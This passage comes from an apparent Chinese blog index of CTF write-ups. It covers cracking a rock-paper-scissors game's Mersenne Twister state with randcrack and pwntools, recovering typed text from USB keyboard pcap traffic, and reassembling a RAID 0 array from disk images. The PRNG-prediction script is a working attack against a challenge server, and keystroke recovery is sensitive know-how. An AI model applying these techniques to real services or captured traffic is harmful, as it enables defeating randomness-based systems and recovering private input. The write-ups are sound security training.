石头剪刀布()函数 我们可以知道如何算出泷奈出拳时产生的随机数：\n我们已知： 1.泷奈出的是石头还是剪刀还是布 设 mark= 0 ，1 ，2 来表示 2.猜拳的轮标识符 又由 轮标识符 = (随机数 // 3) ^ 轮哈希 可得 随机数//3 = 轮标识符 ^ 轮哈希 3.当我们已知mark的时候，我们就可以知道轮哈希的值 for i in range(3): 轮哈希 = int(md5(str(i).encode()).hexdigest()[4:12], 16) print(轮哈希) 输出结果为： 545560021 1111007417 1921883468 我们设： hhh = [545560021, 1111007417, 1921883468] 4.由上述可得随机数的值可以这样求： 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark 关于如何自动化识别泷奈怎么出拳以及自动化预测下一个出拳并取得猜拳的胜利，就需要用python来写一个脚本了（需要用到pwntools库），具体代码如下：\n# encoding: utf-8 # codingc= unicode from pwn import * import random, time from randcrack import RandCrack import re rc = RandCrack() context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 37069) #taolve 是本人曾用过的用户名，没什么特殊含义， #也可以随便改，一般则使用 r=remote()来表示远程 # 石头剪刀布映射 = [\u0026#34;石头\u0026#34;, \u0026#34;剪刀\u0026#34;, \u0026#34;布\u0026#34;] # ============第一次，提交前512个数============== hhh = [545560021, 1111007417, 1921883468] answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;0\u0026#34;) for i in range(512): answer1 = taolve.recv(15) answer2 = taolve.recv(6) if i != 0: print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: 千束出的是 = \u0026#34;剪刀\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: 千束出的是 = \u0026#34;石头\u0026#34; mark = 0 else: 千束出的是 = \u0026#34;布\u0026#34; mark = 2 print(千束出的是) 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark rc.submit(随机数) answer3 = taolve.recvuntil(b\u0026#34;: #\u0026#34;) answer4 = answer1 + answer2 + answer3 print(answer4.decode(\u0026#39;utf-8\u0026#39;)) 轮标识符 = taolve.recv(8).decode(\u0026#39;utf-8\u0026#39;) print(轮标识符) 轮标识数字 = int(轮标识符, 16) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;the last one!!!!!!!!!!\u0026#34;) #第一局猜拳的最后一次 answer1 = taolve.recv(15) answer2 = taolve.recv(6) print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: 千束出的是 = \u0026#34;剪刀\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: 千束出的是 = \u0026#34;石头\u0026#34; mark = 0 else: 千束出的是 = \u0026#34;布\u0026#34; mark = 2 print(千束出的是) 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark rc.submit(随机数) # ================第二次==================== answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;0\u0026#34;) for i in range(512): if i\u0026lt;113: answer1 = taolve.recv(15) answer2 = taolve.recv(6) if i != 0: print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: 千束出的是 = \u0026#34;剪刀\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: 千束出的是 = \u0026#34;石头\u0026#34; mark = 0 else: 千束出的是 = \u0026#34;布\u0026#34; mark = 2 print(千束出的是) 随机数除3 = 轮标识数字 ^ hhh[mark] 随机数 = 3 * 随机数除3 + mark rc.submit(随机数) answer3 = taolve.recvuntil(b\u0026#34;: #\u0026#34;) answer4 = answer1 + answer2 + answer3 print(answer4.decode(\u0026#39;utf-8\u0026#39;)) 轮标识符 = taolve.recv(8).decode(\u0026#39;utf-8\u0026#39;) print(轮标识符) 轮标识数字 = int(轮标识符, 16) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) else: if i == 113: #提交了624个随机数了，接下来可以看看预测的效果了 aa = rc.predict_getrandbits(32) 随机数 = rc.predict_getrandbits(32) mark = 随机数 % 3 轮标识符 = (随机数 // 3) ^ hhh[mark] print(\u0026#34;预测：\u0026#34;) print(hex(轮标识符)[2:].zfill(8)) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) if mark == 0: taolve.sendline(\u0026#34;布\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了布\u0026#34;) if mark == 1: taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了石头\u0026#34;) if mark == 2: taolve.sendline(\u0026#34;剪刀\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了剪刀\u0026#34;) #==============最后一局，认真模式：================== answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;1\u0026#34;) for i in range(512): 随机数 = rc.predict_getrandbits(32) mark = 随机数 % 3 轮标识符 = (随机数 // 3) ^ hhh[mark] print(\u0026#34;预测：\u0026#34;) print(hex(轮标识符)[2:].zfill(8)) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) if mark == 0: taolve.sendline(\u0026#34;布\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了布\u0026#34;) if mark == 1: taolve.sendline(\u0026#34;石头\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了石头\u0026#34;) if mark == 2: taolve.sendline(\u0026#34;剪刀\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;我出了剪刀\u0026#34;) taolve.interactive() 运行结果： ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/10_chisato_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-Chisato"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r先 nc 一下，提示在shadow中寻找flag 第一反应是写一个remote远程连接脚本看看他是不是发了未显示的字节过来 代码如下：\nfrom pwn import * context.log_level = \u0026#39;debug\u0026#39; #debug模式下可以清除地看到他发送的字节 taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 47389) taolve.interactive() 可以看到flag字节： 关闭debug模式方便搜集flag: ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/8_shadow_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-Shadow"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r用wireshark分析了一下流量包后发现是usb的键盘流量，在网上找了一些现成的脚本，但是有一些效果不太好，最后选择了下面的这个脚本，成功跑出了第一阶段的 flag python脚本如下：\n#!/usr/bin/env python # coding:utf-8 import argparse import os from tempfile import NamedTemporaryFile BOOT_KEYBOARD_MAP = { 0x00: (None, None), # Reserved (no event indicated) 0x01: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # ErrorRollOver 0x02: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # POSTFail 0x03: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # ErrorUndefined 0x04: (\u0026#39;a\u0026#39;, \u0026#39;A\u0026#39;), # a 0x05: (\u0026#39;b\u0026#39;, \u0026#39;B\u0026#39;), # b 0x06: (\u0026#39;c\u0026#39;, \u0026#39;C\u0026#39;), # c 0x07: (\u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;), # d 0x08: (\u0026#39;e\u0026#39;, \u0026#39;E\u0026#39;), # e 0x09: (\u0026#39;f\u0026#39;, \u0026#39;F\u0026#39;), # f 0x0a: (\u0026#39;g\u0026#39;, \u0026#39;G\u0026#39;), # g 0x0b: (\u0026#39;h\u0026#39;, \u0026#39;H\u0026#39;), # h 0x0c: (\u0026#39;i\u0026#39;, \u0026#39;I\u0026#39;), # i 0x0d: (\u0026#39;j\u0026#39;, \u0026#39;J\u0026#39;), # j 0x0e: (\u0026#39;k\u0026#39;, \u0026#39;K\u0026#39;), # k 0x0f: (\u0026#39;l\u0026#39;, \u0026#39;L\u0026#39;), # l 0x10: (\u0026#39;m\u0026#39;, \u0026#39;M\u0026#39;), # m 0x11: (\u0026#39;n\u0026#39;, \u0026#39;N\u0026#39;), # n 0x12: (\u0026#39;o\u0026#39;, \u0026#39;O\u0026#39;), # o 0x13: (\u0026#39;p\u0026#39;, \u0026#39;P\u0026#39;), # p 0x14: (\u0026#39;q\u0026#39;, \u0026#39;Q\u0026#39;), # q 0x15: (\u0026#39;r\u0026#39;, \u0026#39;R\u0026#39;), # r 0x16: (\u0026#39;s\u0026#39;, \u0026#39;S\u0026#39;), # s 0x17: (\u0026#39;t\u0026#39;, \u0026#39;T\u0026#39;), # t 0x18: (\u0026#39;u\u0026#39;, \u0026#39;U\u0026#39;), # u 0x19: (\u0026#39;v\u0026#39;, \u0026#39;V\u0026#39;), # v 0x1a: (\u0026#39;w\u0026#39;, \u0026#39;W\u0026#39;), # w 0x1b: (\u0026#39;x\u0026#39;, \u0026#39;X\u0026#39;), # x 0x1c: (\u0026#39;y\u0026#39;, \u0026#39;Y\u0026#39;), # y 0x1d: (\u0026#39;z\u0026#39;, \u0026#39;Z\u0026#39;), # z 0x1e: (\u0026#39;1\u0026#39;, \u0026#39;!\u0026#39;), # 1 0x1f: (\u0026#39;2\u0026#39;, \u0026#39;@\u0026#39;), # 2 0x20: (\u0026#39;3\u0026#39;, \u0026#39;#\u0026#39;), # 3 0x21: (\u0026#39;4\u0026#39;, \u0026#39;$\u0026#39;), # 4 0x22: (\u0026#39;5\u0026#39;, \u0026#39;%\u0026#39;), # 5 0x23: (\u0026#39;6\u0026#39;, \u0026#39;^\u0026#39;), # 6 0x24: (\u0026#39;7\u0026#39;, \u0026#39;\u0026amp;\u0026#39;), # 7 0x25: (\u0026#39;8\u0026#39;, \u0026#39;*\u0026#39;), # 8 0x26: (\u0026#39;9\u0026#39;, \u0026#39;(\u0026#39;), # 9 0x27: (\u0026#39;0\u0026#39;, \u0026#39;)\u0026#39;), # 0 0x28: (\u0026#39;\\n\u0026#39;, \u0026#39;\\n\u0026#39;), # Return (ENTER) 0x29: (\u0026#39;[ESC]\u0026#39;, \u0026#39;[ESC]\u0026#39;), # Escape 0x2a: (\u0026#39;\\b\u0026#39;, \u0026#39;\\b\u0026#39;), # Backspace 0x2b: (\u0026#39;\\t\u0026#39;, \u0026#39;\\t\u0026#39;), # Tab 0x2c: (\u0026#39; \u0026#39;, \u0026#39; \u0026#39;), # Spacebar 0x2d: (\u0026#39;-\u0026#39;, \u0026#39;_\u0026#39;), # - 0x2e: (\u0026#39;=\u0026#39;, \u0026#39;+\u0026#39;), # = 0x2f: (\u0026#39;[\u0026#39;, \u0026#39;{\u0026#39;), # [ 0x30: (\u0026#39;]\u0026#39;, \u0026#39;}\u0026#39;), # ] 0x31: (\u0026#39;\\\\\u0026#39;, \u0026#39;|\u0026#39;), # \\ 0x32: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Non-US # and ~ 0x33: (\u0026#39;;\u0026#39;, \u0026#39;:\u0026#39;), # ; 0x34: (\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;), # \u0026#39; 0x35: (\u0026#39;`\u0026#39;, \u0026#39;~\u0026#39;), # ` 0x36: (\u0026#39;,\u0026#39;, \u0026#39;\u0026lt;\u0026#39;), # , 0x37: (\u0026#39;.\u0026#39;, \u0026#39;\u0026gt;\u0026#39;), # . 0x38: (\u0026#39;/\u0026#39;, \u0026#39;?\u0026#39;), # / 0x39: (\u0026#39;[CAPSLOCK]\u0026#39;, \u0026#39;[CAPSLOCK]\u0026#39;), # Caps Lock 0x3a: (\u0026#39;[F1]\u0026#39;, \u0026#39;[F1]\u0026#39;), # F1 0x3b: (\u0026#39;[F2]\u0026#39;, \u0026#39;[F2]\u0026#39;), # F2 0x3c: (\u0026#39;[F3]\u0026#39;, \u0026#39;[F3]\u0026#39;), # F3 0x3d: (\u0026#39;[F4]\u0026#39;, \u0026#39;[F4]\u0026#39;), # F4 0x3e: (\u0026#39;[F5]\u0026#39;, \u0026#39;[F5]\u0026#39;), # F5 0x3f: (\u0026#39;[F6]\u0026#39;, \u0026#39;[F6]\u0026#39;), # F6 0x40: (\u0026#39;[F7]\u0026#39;, \u0026#39;[F7]\u0026#39;), # F7 0x41: (\u0026#39;[F8]\u0026#39;, \u0026#39;[F8]\u0026#39;), # F8 0x42: (\u0026#39;[F9]\u0026#39;, \u0026#39;[F9]\u0026#39;), # F9 0x43: (\u0026#39;[F10]\u0026#39;, \u0026#39;[F10]\u0026#39;), # F10 0x44: (\u0026#39;[F11]\u0026#39;, \u0026#39;[F11]\u0026#39;), # F11 0x45: (\u0026#39;[F12]\u0026#39;, \u0026#39;[F12]\u0026#39;), # F12 0x46: (\u0026#39;[PRINTSCREEN]\u0026#39;, \u0026#39;[PRINTSCREEN]\u0026#39;), # Print Screen 0x47: (\u0026#39;[SCROLLLOCK]\u0026#39;, \u0026#39;[SCROLLLOCK]\u0026#39;), # Scroll Lock 0x48: (\u0026#39;[PAUSE]\u0026#39;, \u0026#39;[PAUSE]\u0026#39;), # Pause 0x49: (\u0026#39;[INSERT]\u0026#39;, \u0026#39;[INSERT]\u0026#39;), # Insert 0x4a: (\u0026#39;[HOME]\u0026#39;, \u0026#39;[HOME]\u0026#39;), # Home 0x4b: (\u0026#39;[PAGEUP]\u0026#39;, \u0026#39;[PAGEUP]\u0026#39;), # Page Up 0x4c: (\u0026#39;[DELETE]\u0026#39;, \u0026#39;[DELETE]\u0026#39;), # Delete Forward 0x4d: (\u0026#39;[END]\u0026#39;, \u0026#39;[END]\u0026#39;), # End 0x4e: (\u0026#39;[PAGEDOWN]\u0026#39;, \u0026#39;[PAGEDOWN]\u0026#39;), # Page Down 0x4f: (\u0026#39;[RIGHTARROW]\u0026#39;, \u0026#39;[RIGHTARROW]\u0026#39;), # Right Arrow 0x50: (\u0026#39;[LEFTARROW]\u0026#39;, \u0026#39;[LEFTARROW]\u0026#39;), # Left Arrow 0x51: (\u0026#39;[DOWNARROW]\u0026#39;, \u0026#39;[DOWNARROW]\u0026#39;), # Down Arrow 0x52: (\u0026#39;[UPARROW]\u0026#39;, \u0026#39;[UPARROW]\u0026#39;), # Up Arrow 0x53: (\u0026#39;[NUMLOCK]\u0026#39;, \u0026#39;[NUMLOCK]\u0026#39;), # Num Lock 0x54: (\u0026#39;[KEYPADSLASH]\u0026#39;, \u0026#39;/\u0026#39;), # Keypad / 0x55: (\u0026#39;[KEYPADASTERISK]\u0026#39;, \u0026#39;*\u0026#39;), # Keypad * 0x56: (\u0026#39;[KEYPADMINUS]\u0026#39;, \u0026#39;-\u0026#39;), # Keypad - 0x57: (\u0026#39;[KEYPADPLUS]\u0026#39;, \u0026#39;+\u0026#39;), # Keypad + 0x58: (\u0026#39;[KEYPADENTER]\u0026#39;, \u0026#39;[KEYPADENTER]\u0026#39;), # Keypad ENTER 0x59: (\u0026#39;[KEYPAD1]\u0026#39;, \u0026#39;1\u0026#39;), # Keypad 1 and End 0x5a: (\u0026#39;[KEYPAD2]\u0026#39;, \u0026#39;2\u0026#39;), # Keypad 2 and Down Arrow 0x5b: (\u0026#39;[KEYPAD3]\u0026#39;, \u0026#39;3\u0026#39;), # Keypad 3 and PageDn 0x5c: (\u0026#39;[KEYPAD4]\u0026#39;, \u0026#39;4\u0026#39;), # Keypad 4 and Left Arrow 0x5d: (\u0026#39;[KEYPAD5]\u0026#39;, \u0026#39;5\u0026#39;), # Keypad 5 0x5e: (\u0026#39;[KEYPAD6]\u0026#39;, \u0026#39;6\u0026#39;), # Keypad 6 and Right Arrow 0x5f: (\u0026#39;[KEYPAD7]\u0026#39;, \u0026#39;7\u0026#39;), # Keypad 7 and Home 0x60: (\u0026#39;[KEYPAD8]\u0026#39;, \u0026#39;8\u0026#39;), # Keypad 8 and Up Arrow 0x61: (\u0026#39;[KEYPAD9]\u0026#39;, \u0026#39;9\u0026#39;), # Keypad 9 and Page Up 0x62: (\u0026#39;[KEYPAD0]\u0026#39;, \u0026#39;0\u0026#39;), # Keypad 0 and Insert 0x63: (\u0026#39;[KEYPADPERIOD]\u0026#39;, \u0026#39;.\u0026#39;), # Keypad . and Delete 0x64: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Non-US \\ and | 0x65: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Application 0x66: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Power 0x67: (\u0026#39;[KEYPADEQUALS]\u0026#39;, \u0026#39;=\u0026#39;), # Keypad = 0x68: (\u0026#39;[F13]\u0026#39;, \u0026#39;[F13]\u0026#39;), # F13 0x69: (\u0026#39;[F14]\u0026#39;, \u0026#39;[F14]\u0026#39;), # F14 0x6a: (\u0026#39;[F15]\u0026#39;, \u0026#39;[F15]\u0026#39;), # F15 0x6b: (\u0026#39;[F16]\u0026#39;, \u0026#39;[F16]\u0026#39;), # F16 0x6c: (\u0026#39;[F17]\u0026#39;, \u0026#39;[F17]\u0026#39;), # F17 0x6d: (\u0026#39;[F18]\u0026#39;, \u0026#39;[F18]\u0026#39;), # F18 0x6e: (\u0026#39;[F19]\u0026#39;, \u0026#39;[F19]\u0026#39;), # F19 0x6f: (\u0026#39;[F20]\u0026#39;, \u0026#39;[F20]\u0026#39;), # F20 0x70: (\u0026#39;[F21]\u0026#39;, \u0026#39;[F21]\u0026#39;), # F21 0x71: (\u0026#39;[F22]\u0026#39;, \u0026#39;[F22]\u0026#39;), # F22 0x72: (\u0026#39;[F23]\u0026#39;, \u0026#39;[F23]\u0026#39;), # F23 0x73: (\u0026#39;[F24]\u0026#39;, \u0026#39;[F24]\u0026#39;), # F24 } def parse_boot_keyboard_report(data: bytearray): # 数据解析函数 modifiers = data[0] # 修改键字节 keys = data[2:8] # 键码字节 # 将修改键字节中的位解码为按键修饰符 ctrl = (modifiers \u0026amp; 0x11) != 0 shift = (modifiers \u0026amp; 0x22) != 0 alt = (modifiers \u0026amp; 0x44) != 0 gui = (modifiers \u0026amp; 0x88) != 0 # 解析键码字节并将其映射为字符 characters = [] for key in keys: if key != 0: # 键码不为0则查询映射表 if key in BOOT_KEYBOARD_MAP: characters.append(BOOT_KEYBOARD_MAP[key][shift]) else: characters.append(None) return (ctrl, shift, alt, gui, characters) def help_formatter(prog): return argparse.HelpFormatter(prog, max_help_position=40) def main(): # 解析命令行参数 parser = argparse.ArgumentParser( description=\u0026#39;Parse keyboard report data and output as text\u0026#39;, formatter_class=help_formatter) parser.add_argument(\u0026#39;pcapng_file\u0026#39;, help=\u0026#39;path to the pcapng file\u0026#39;) args = parser.parse_args() # 通过tshark解析pcapng文件，获取键盘数据包 # 需要先安装wireshark，并且添加到环境变量中 tmpfile = NamedTemporaryFile(delete=False) tmpfile.close() command = \u0026#34;tshark -r %s -T fields -e usbhid.data -e usb.capdata \u0026gt; %s\u0026#34; % ( args.pcapng_file, tmpfile.name) os.system(command) with open(tmpfile.name, \u0026#39;r\u0026#39;) as f: lines = f.readlines() os.unlink(tmpfile.name) # 解析键盘数据包，获取输入字符 text = \u0026#34;\u0026#34; for line in lines: capdata = line.strip().replace(\u0026#39;:\u0026#39;, \u0026#39;\u0026#39;) if capdata: data = bytearray.fromhex(capdata) characters = parse_boot_keyboard_report(data)[-1] for character in characters: if character: text += character else: pass raw_text = repr(text) print(f\u0026#39;Raw output:\\n{raw_text}\u0026#39;) print(f\u0026#39;Text output:\\n{text}\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: main() 运行结果如下： flag如下： Ww4terCTF[CAPSLOCK]{[YOu_-@2r3_tH3_-[CAPSLOCK]MmaST3R_-o1+-USB-[CAPSLOCK]Ttr@2 f[CAPSLOCK]f!1C_-aN@2Iys!1s}]\n一阶段flag特殊符[CAPSLOCK]未删除，按照[CAPSLOCK]的规则将flag修改一下： Ww4terCTF{[yoU_-@2R3_Th3_-MmaST3R_-o1+-USB-tTR@Ff!1C_-aN@2Iys!1s}]\n还可以明显看出flag有字符重复输入，所以删掉那些有可能是重复输入的字符： W4terCTF{yoU_@R3_Th3_MaST3R_o1+_USB_tR@Ff!C_aN@Iys!s}\n但是提交flag的时候显示flag错误，则可能是一些多余字符未删除，这里我们发现o1后面的 \u0026lsquo;+\u0026rsquo; 字符好像是多余的，删除后得到： W4terCTF{yoU_@R3_Th3_MaST3R_o1_USB_tR@Ff!C_aN@Iys!s}\n提交 flag，正确！\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/9_usb-hacker_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-USB Hacker"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r本题wp的结构如下：（前排提示，该题wp有点多）\n题目描述 # ​\t2023 年 3 月 31 日半夜，暴雨。 ​\tGZTime 发现已经跑了?整天的 python 脚本挂了，满眼所见皆为 IO Error。 ​\t「坏了！我还得靠这玩意交作业！」他想，之后赶忙去检查了一下硬盘的情况——看起来数据都正常，只是大概由于暴雨的缘故（bushi）关于 RAID 的元信息全不见了—— 而 GZTime 也忘记了当初组 RAID 的时候的各项参数……一番搜索，恢复数据似乎得花不少钱，但是他听说这里似乎在做什么安全相关的东西——或许你能帮上忙？\n一 判断磁盘顺序 # 1.初步分析 # 先下载附件，发现是8 个磁盘文件， 题目的hint提示:“这一组磁盘的 RAID 类型为 RAID 0”，所以用我们最好的朋友——搜索引擎来搜索相关信息，得知要把这8个磁盘文件当作一个逻辑卷来读取访问。 接着再查找组装RAID 0 的方法，发现需要按照一定的顺序来组装，所以涉及到判断磁盘文件顺序的问题。 但是要如何判断呢？在搜索引擎搜索得到的答案都不太好操作，最后在发现 hackergame2021 的阵列恢复大师 一题与我们的题目有着共通之处，于是参考 taoky师傅 的wp 来组装我们的磁盘， https://gitee.com/Scripter_doge/hackergame2021-writeups/blob/master/official/%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88/README.md # 2.确定首尾文件与块的大小 # 先在虚拟机里用file命令查看我们的8个映像文件，\nfile *.img 得到： 可以看到 UkAQZEahRpFP.img 冒号后面有“DOS、MBR boot sector”，有 MBR 头，并且第一块分区 ID 是 0xee。这表明整块磁盘实际上是 GPT 格式的，并且 UkAQZEahRpFP.img 就是我们的第一块盘。 接下来要分析 GPT 的元信息，将文件拖到010editor或者其他十六进制编辑器来查看，具体操作紧跟taoky师傅的题解： 我们使用的命令：\n(echo \u0026#34;P5 1024 16384 255\u0026#34;; cat UkAQZEahRpFP.img) \u0026gt; ./UkAQZEahRpFP.pgm 用Honeyview打开图片得到： 参考taoky师傅的题解： 我们磁盘对应的十六进制文本： 使用命令：\nfor i in *.img; do echo $i \u0026amp;\u0026amp; hexdump -C $i | grep \u0026#39;EFI PART\u0026#39;; done 看看可能的块边缘（0x10000 = 64 KB 的倍数)的情况：\nfor i in *.img; do echo $i \u0026amp;\u0026amp; hexdump -C $i | grep \u0026#39;0000 \u0026#39;; done \u0026gt; ./tmp1 但是并没有什么有意思的字符串，有点小失望 所以我们直接用十六进制编辑器打开这8个磁盘文件，先用ctrl+F 尝试搜索一些字符串“flag”、“key”、“ctf”等等，（用 ctrl+shift+F 多文件查找更方便），发现在BpStXfb7DgbO.img和KESNic6iRwY3.img文件中有许多的“flag.7z”字符串，看来我们的flag最后会在一个7z压缩包里。 在十六进制编辑器观察UkAQZEahRpFP.img的数据，可以明显发现：\n0x200000 前面的数据被截断了，代表 0x200000 是块大小的倍数；\n0x200000 到 0x2c0000 是明显连续的数据，中间没有被截断；\n0x2c0000 后开始出现了明显的数据截断。\n所以可以推得块大小是 0x2c0000 - 0x200000 = 786432 B = 768 KB。\n（其实恢复的磁盘分块大小为 256 扇区、128KB大小，该方法可能会稍微放大一些，但是在实战中还是可以用的，只是后面拼图的时候不太好看出来）\n但是,当我们用同样的方法来计算其他硬盘文件的块大小的时候，会发现不同文件的块大小并不完全一样，所以这里我们采用他们的较大公约数 128 KB 来作为他们的块大小。\n3.Python代码求磁盘顺序 # 下一步我们需要知道盘的顺序。虽然可以找刚好被截断的文件一个个推顺序，~~但是直接在taoky师傅的代码上改一改就用不是更简单吗？~~但我们也可以借这个机会学习一下优秀师傅的Python代码，也学习一下Python的 matplotlib 库：\nimport numpy as np import matplotlib.pyplot as plt files = [\u0026#39;UkAQZEahRpFP.img\u0026#39;, \u0026#39;G6i0ErEQwiFm.img\u0026#39;, \u0026#39;NKGGtuKv6Qr4.img\u0026#39;, \u0026#39;O53ORjQLbNjg.img\u0026#39;, \u0026#39;q8snWXN5Ltwx.img\u0026#39;, \u0026#39;Y1et5EJL2XGX.img\u0026#39;, \u0026#39;BpStXfb7DgbO.img\u0026#39;, \u0026#39;KESNic6iRwY3.img\u0026#39;] # 第一块和最后一块盘是已知的 \u0026#39;\u0026#39;\u0026#39; 拼图游戏的玩法： 鼠标拖动上面8个文件的字符串，改变他们的顺序后运行代码，比对生成的图片，找出正确的磁盘顺序 \u0026#39;\u0026#39;\u0026#39; my_block = 128 # 我们的块的大小,可以取128,256,512等等,多取几次来判断 start = 0 # 从头开始读取 sz = 16 * 1024 * 1024 # 读取的文件大小 (bytes) n = my_block * 1024 # 块大小 b = 1024 # 用于求和的小块大小 data = [] for fn in files: with open(\u0026#34;./\u0026#34; + fn, \u0026#39;rb\u0026#39;) as f: f.seek(start, 0) data.append(np.frombuffer(f.read(sz), dtype=np.uint8)) p = [[np.sum(data[f][i * n + j * b: i * n + j * b + b]) for f in range(len(files)) for j in range(n // b)] for i in range(sz // n)] # i: 块, j: 小块, f: 文件 graph = np.array(p) print(graph.shape) plt.matshow(graph, aspect=\u0026#39;auto\u0026#39;) plt.xticks(np.arange(0, my_block*8+0.1, step=my_block)) plt.yticks(np.arange(0, 128.1, step=16)) plt.show() 最后得到的正确顺序是：\nfiles = [\u0026#39;UkAQZEahRpFP.img\u0026#39;, \u0026#39;G6i0ErEQwiFm.img\u0026#39;, \u0026#39;NKGGtuKv6Qr4.img\u0026#39;, \u0026#39;O53ORjQLbNjg.img\u0026#39;, \u0026#39;q8snWXN5Ltwx.img\u0026#39;, \u0026#39;Y1et5EJL2XGX.img\u0026#39;, \u0026#39;BpStXfb7DgbO.img\u0026#39;, \u0026#39;KESNic6iRwY3.img\u0026#39;] 二 组装磁盘文件 # 下一步：按我们求出顺序挂载分区（挂载的时候就可以检测我们的顺序是否有误了） 我们使用Linux losetup 命令来设置循环设备，关于循环设备（loop）： 循环设备可把文件虚拟成区块设备，籍以模拟整个文件系统，让用户得以将其视为硬盘驱动器，光驱或软驱等设备，并挂入当作目录来使用。\n//先看看我们可用的loop，一般只会显示一个设备， //每挂载一个文件使用一次查看下一个可用loop,不过一般来说都是按顺序的，直接挂载也可以。 sudo losetup -f //然后按顺序挂载，taoky师傅采用的是只读挂载，避免有错误的写入： sudo losetup --read-only /dev/loop0 UkAQZEahRpFP.img sudo losetup --read-only /dev/loop1 G6i0ErEQwiFm.img sudo losetup --read-only /dev/loop2 NKGGtuKv6Qr4.img sudo losetup --read-only /dev/loop3 O53ORjQLbNjg.img sudo losetup --read-only /dev/loop4 q8snWXN5Ltwx.img sudo losetup --read-only /dev/loop5 Y1et5EJL2XGX.img sudo losetup --read-only /dev/loop6 BpStXfb7DgbO.img sudo losetup --read-only 